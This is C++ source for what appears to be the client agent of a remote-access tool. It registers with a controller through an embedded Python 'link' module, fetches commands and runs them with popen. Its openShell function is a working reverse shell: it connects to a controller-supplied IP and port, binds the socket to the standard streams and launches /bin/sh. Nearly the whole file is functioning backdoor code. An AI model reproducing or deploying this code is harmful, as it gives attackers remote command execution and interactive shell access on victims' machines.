

#include <iostream>
#include "clientManager.h"


/*for reverse shell*/
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <sys/wait.h> //waitpid
#include <unistd.h>

using namespace std;

clientManager::clientManager(){

    pModule =  PyImport_Import(PyUnicode_FromString("link"));
    
    link = PyObject_GetAttrString(pModule, "link");
    ficar = makeRegister();
}

clientManager::~clientManager(){

}


bool
clientManager::getRegisterMade()
{
    return ficar;
}

string
clientManager::getComand()
{
    cout << "geting command"<< endl;
    return PyUnicode_AsUTF8(PyObject_CallMethod(link, "getCMD", NULL));
}

vector <string>
clientManager::getArgs()
{
    vector <string> saida;
    cout << "geting args"<< endl;

    Py_ssize_t size = (Py_ssize_t) PyLong_AsLong(PyObject_CallMethod(link, "getArgsSize", NULL));
    CPyObject lista = PyList_New(size);
    lista = PyObject_CallMethod(link, "getArgs", NULL);
    for (long i = 0; (Py_ssize_t)i < size ;i++)
        saida.push_back(string(PyUnicode_AsUTF8(PyList_GetItem(lista,(Py_ssize_t) i))));
    
    return saida;
    
}

bool
clientManager::makeRegister()
{
    cout << "Registering" << endl;

    CPyObject isOk= PyObject_CallMethod(link, "makeRegister", NULL);

    if (isOk==Py_True)
    {
        cout << "Register confirmed" << endl;
        return true;
    }
    else 
    {
        cout << "Register not confirmed" << endl;
        return false;
    }
}


void 
clientManager::openShell(vector<string> cmd)
{
    struct sockaddr_in sa;
    int s;
    unsigned port = std::stoul (cmd[1]);
    pid_t pid_fork;
    string response;
    int status;

    cout << "running shell." << endl;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(cmd[0].c_str());
    sa.sin_port = htons(port);
    
    pid_fork=fork();
    //if child
    if(pid_fork==0)
    {
        if ((s = socket(AF_INET, SOCK_STREAM, 0))!=-1 )
        {
            if (connect(s, (struct sockaddr *)&sa, sizeof(sa))==0)
            {
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);

                cout << "starting bash" << endl;

                system("/bin/sh");
            }
            else 
            {
                response=string("not connect") + strerror (errno);
            }
        }
        else {
            response=string("shell failed!") + strerror (errno);
        }
        PyObject_CallMethod(link, "report", "(s)", response.c_str());
        //manager.report(response.c_str());

    }
    else
    {
        cout << "if 1" << endl;
        waitpid(pid_fork,&status,0 );
        if (WIFEXITED(status))
        {
            printf("Exited Normally\n");
        }
    }
    
}





void 
clientManager::execute(vector <string> cmd)//execProgram
{
    cout << "execProgram não implementado: " << endl;
    PyObject_CallMethod(link, "report", "(s)", "execProgram não implementado");
}

void 
clientManager::run(vector <string> cmd)//runCommand
{

    if (cmd.size() == 1)
    {
        char buffer[128];
        string result = "";

        cout << "Executing command: " << cmd[0] << endl;
        
        FILE* pipe = popen(cmd[0].c_str(), "r");

        if (!pipe){
            PyObject_CallMethod(link, "report", "(s)", "file was not sent");
            cout << "command not found" << endl;
        }
        else {
            try {
                while (fgets(buffer, sizeof buffer, pipe) != NULL) {
                   result += buffer;
                }
            } 
            catch (...) 
            {
                pclose(pipe);
                cout << "command nor response of terminal." << endl;
            }
        }
        pclose(pipe);

        cout << result << endl;

        PyObject_CallMethod(link, "report", "(s)", "command executed"); //arquivo do admin para o cliente
        cout << "end of command executed" << endl;
        
    }
    else 
    {
        cout << "command not executed: " << cmd.size() << endl;
    } 
}

void 
clientManager::isOK()
{
    PyObject_CallMethod(link, "clientOK", NULL);
}